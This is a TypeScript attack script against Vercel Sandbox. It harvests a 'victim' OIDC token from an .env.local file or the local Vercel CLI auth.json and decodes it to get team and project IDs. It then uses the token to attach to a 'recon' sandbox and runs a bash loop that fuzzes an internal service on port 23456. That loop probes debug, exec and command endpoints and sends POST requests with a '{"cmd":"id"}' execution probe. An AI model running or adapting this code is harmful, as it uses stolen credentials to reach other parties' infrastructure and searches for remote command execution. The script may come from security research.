import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon-1787251919562", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "===== full header of 23456 root ==="
timeout 3 curl -s -i --max-time 2 "http://127.0.0.1:23456/" 2>&1 | head -15
echo "===== path fuzz on 23456 ==="
for path in / /health /healthz /status /api /api/status /api/sandbox /api/info /metrics /debug/pprof /debug/pprof/heap /debug/pprof/goroutine /ws /socket /v1 /v1/status /cmd /exec /run /session /interactive /snapshot /pubkey /id /whoami /info/version /version /v1/info; do
  code=$(timeout 2 curl -s -o /tmp/out -w '%{http_code}' --max-time 2 "http://127.0.0.1:23456$path" 2>/dev/null)
  body=$(head -c 80 /tmp/out 2>/dev/null | tr '\\n' ' ')
  echo "23456 $path -> $code | $body"
done
echo "===== POST variants ==="
for path in / /exec /run /cmd /api/exec /start /stop /ping /status; do
  code=$(timeout 2 curl -s -o /tmp/out -w '%{http_code}' --max-time 2 -X POST -d '{"cmd":"id"}' "http://127.0.0.1:23456$path" 2>/dev/null)
  body=$(head -c 80 /tmp/out 2>/dev/null | tr '\\n' ' ')
  echo "POST 23456 $path -> $code | $body"
done
echo "===== DONE ====="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });